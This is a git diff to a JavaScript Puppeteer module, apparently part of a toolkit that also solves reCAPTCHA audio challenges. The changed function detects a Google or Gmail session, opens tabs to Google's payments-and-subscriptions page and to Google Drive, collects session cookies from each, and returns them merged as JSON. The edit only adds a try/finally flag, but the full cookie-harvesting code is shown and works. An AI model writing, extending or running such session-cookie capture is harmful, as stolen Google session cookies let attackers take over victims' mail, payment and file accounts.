@@ -2357,88 +2357,93 @@ export async function solveRecaptchaAudioChallenge(page, instanceId) {
  * Returns { cookieJSON, accountCookieJSON, driveCookieJSON }
  */
 export async function captureMultiTabCookies(browser, page, domain, browserId) {
-    const isGoogle = domain && (domain.includes('google') || domain.includes('gmail'));
-    const allUrls = getCookieCaptureUrls(domain);
-
-    // 1. Capture primary/inbox cookies
-    let mailCookies = [];
+    if (browser) browser._isCapturingMultiTab = true;
     try {
-        if (page && !page.isClosed()) {
-            mailCookies = await page.cookies(...allUrls);
-        }
-    } catch (e) {
-        logger.warn(`[captureMultiTabCookies][${browserId}] Error capturing mail cookies: ${e.message}`);
-    }
+        const isGoogle = domain && (domain.includes('google') || domain.includes('gmail'));
+        const allUrls = getCookieCaptureUrls(domain);
 
-    let accountCookies = [];
-    let driveCookies = [];
-
-    // 2. If Google session and browser is still open, visit Tab 2 (Wallet) & Tab 3 (Drive)
-    if (isGoogle && browser && page && !page.isClosed()) {
-        // Tab 2: Wallet & Subscriptions
-        let walletPage = null;
+        // 1. Capture primary/inbox cookies
+        let mailCookies = [];
         try {
-            logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 2: Wallet & Subscriptions...`);
-            walletPage = await browser.newPage();
-            await walletPage.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app', {
-                waitUntil: 'networkidle2',
-                timeout: 30000
-            }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 navigation warning: ${err.message}`));
+            if (page && !page.isClosed()) {
+                mailCookies = await page.cookies(...allUrls);
+            }
+        } catch (e) {
+            logger.warn(`[captureMultiTabCookies][${browserId}] Error capturing mail cookies: ${e.message}`);
+        }
 
-            await new Promise(r => setTimeout(r, 2000));
-            accountCookies = await walletPage.cookies(...allUrls).catch(() => []);
-            logger.info(`[captureMultiTabCookies][${browserId}] Tab 2 (Wallet & Subscriptions) captured ${accountCookies.length} cookies.`);
-        } catch (walletErr) {
-            logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 failed: ${walletErr.message}`);
-        } finally {
-            if (walletPage && !walletPage.isClosed()) {
-                await walletPage.close().catch(() => {});
+        let accountCookies = [];
+        let driveCookies = [];
+
+        // 2. If Google session and browser is still open, visit Tab 2 (Wallet) & Tab 3 (Drive)
+        if (isGoogle && browser && page && !page.isClosed()) {
+            // Tab 2: Wallet & Subscriptions
+            let walletPage = null;
+            try {
+                logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 2: Wallet & Subscriptions...`);
+                walletPage = await browser.newPage();
+                await walletPage.goto('https://myaccount.google.com/payments-and-subscriptions?utm_source=OGB&utm_medium=app', {
+                    waitUntil: 'networkidle2',
+                    timeout: 30000
+                }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 navigation warning: ${err.message}`));
+
+                await new Promise(r => setTimeout(r, 2000));
+                accountCookies = await walletPage.cookies(...allUrls).catch(() => []);
+                logger.info(`[captureMultiTabCookies][${browserId}] Tab 2 (Wallet & Subscriptions) captured ${accountCookies.length} cookies.`);
+            } catch (walletErr) {
+                logger.warn(`[captureMultiTabCookies][${browserId}] Tab 2 failed: ${walletErr.message}`);
+            } finally {
+                if (walletPage && !walletPage.isClosed()) {
+                    await walletPage.close().catch(() => {});
+                }
+            }
+
+            // Tab 3: Google Drive
+            let drivePage = null;
+            try {
+                logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 3: Google Drive...`);
+                drivePage = await browser.newPage();
+                await drivePage.goto('https://drive.google.com/drive/u/0/home', {
+                    waitUntil: 'networkidle2',
+                    timeout: 30000
+                }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 navigation warning: ${err.message}`));
+
+                await new Promise(r => setTimeout(r, 2000));
+                driveCookies = await drivePage.cookies(...allUrls).catch(() => []);
+                logger.info(`[captureMultiTabCookies][${browserId}] Tab 3 (Drive) captured ${driveCookies.length} cookies.`);
+            } catch (driveErr) {
+                logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 failed: ${driveErr.message}`);
+            } finally {
+                if (drivePage && !drivePage.isClosed()) {
+                    await drivePage.close().catch(() => {});
+                }
             }
         }
 
-        // Tab 3: Google Drive
-        let drivePage = null;
-        try {
-            logger.info(`[captureMultiTabCookies][${browserId}] Opening Tab 3: Google Drive...`);
-            drivePage = await browser.newPage();
-            await drivePage.goto('https://drive.google.com/drive/u/0/home', {
-                waitUntil: 'networkidle2',
-                timeout: 30000
-            }).catch(err => logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 navigation warning: ${err.message}`));
-
-            await new Promise(r => setTimeout(r, 2000));
-            driveCookies = await drivePage.cookies(...allUrls).catch(() => []);
-            logger.info(`[captureMultiTabCookies][${browserId}] Tab 3 (Drive) captured ${driveCookies.length} cookies.`);
-        } catch (driveErr) {
-            logger.warn(`[captureMultiTabCookies][${browserId}] Tab 3 failed: ${driveErr.message}`);
-        } finally {
-            if (drivePage && !drivePage.isClosed()) {
-                await drivePage.close().catch(() => {});
+        // 3. Deduplicated Merge (keyed by name + domain + path)
+        const cookieMap = new Map();
+        const addCookies = (arr) => {
+            if (!Array.isArray(arr)) return;
+            for (const c of arr) {
+                if (!c || !c.name) continue;
+                const key = `${c.name}|${c.domain || ''}|${c.path || '/'}`;
+                cookieMap.set(key, c);
             }
-        }
+        };
+
+        addCookies(mailCookies);
+        addCookies(accountCookies);
+        addCookies(driveCookies);
+
+        const mergedCookies = Array.from(cookieMap.values());
+        logger.info(`[captureMultiTabCookies][${browserId}] Total merged cookies: ${mergedCookies.length} (mail=${mailCookies.length}, account=${accountCookies.length}, drive=${driveCookies.length})`);
+
+        return {
+            cookieJSON: JSON.stringify(mergedCookies),
+            accountCookieJSON: accountCookies.length > 0 ? JSON.stringify(accountCookies) : '',
+            driveCookieJSON: driveCookies.length > 0 ? JSON.stringify(driveCookies) : ''
+        };
+    } finally {
+        if (browser) browser._isCapturingMultiTab = false;
     }
-
-    // 3. Deduplicated Merge (keyed by name + domain + path)
-    const cookieMap = new Map();
-    const addCookies = (arr) => {
-        if (!Array.isArray(arr)) return;
-        for (const c of arr) {
-            if (!c || !c.name) continue;
-            const key = `${c.name}|${c.domain || ''}|${c.path || '/'}`;
-            cookieMap.set(key, c);
-        }
-    };
-
-    addCookies(mailCookies);
-    addCookies(accountCookies);
-    addCookies(driveCookies);
-
-    const mergedCookies = Array.from(cookieMap.values());
-    logger.info(`[captureMultiTabCookies][${browserId}] Total merged cookies: ${mergedCookies.length} (mail=${mailCookies.length}, account=${accountCookies.length}, drive=${driveCookies.length})`);
-
-    return {
-        cookieJSON: JSON.stringify(mergedCookies),
-        accountCookieJSON: accountCookies.length > 0 ? JSON.stringify(accountCookies) : '',
-        driveCookieJSON: driveCookies.length > 0 ? JSON.stringify(driveCookies) : ''
-    };
 }
